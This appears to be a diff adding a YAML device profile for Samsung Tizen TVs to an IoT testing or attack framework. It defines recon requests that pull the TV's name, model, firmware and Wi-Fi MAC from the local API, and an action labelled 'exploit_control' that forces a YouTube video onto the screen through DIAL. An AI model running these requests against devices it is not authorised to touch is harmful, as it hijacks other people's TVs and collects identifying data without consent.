@@ -1,0 +1,46 @@
+id: samsung-tv
+device_type: tv
+vendor: Samsung
+family: samsung-tizen
+requires: {}
+actions:
+  - id: device-info
+    label: "Get Tizen device info"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8001/api/v2/"
+          save_as: info
+      - extract:
+          from: $info
+          fields:
+            name: '"name":"([^"]+)"'
+            model: '"modelName":"([^"]+)"'
+            fw: '"OS":"([^"]+)"'
+            wifi: '"wifiMac":"([^"]+)"'
+
+  - id: upnp-dial-apps
+    label: "List DIAL apps (Netflix / YouTube / Prime)"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8001/apps/YouTube"
+          save_as: youtube
+      - http_request:
+          url: "http://{{target.ip}}:8001/apps/Netflix"
+          save_as: netflix
+
+  - id: force-youtube
+    label: "Force YouTube video (DIAL)"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "Interrupt whatever is playing on the TV?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:8001/apps/YouTube"
+          method: POST
+          headers:
+            Content-Type: application/x-www-form-urlencoded
+          body: "v=dQw4w9WgXcQ"
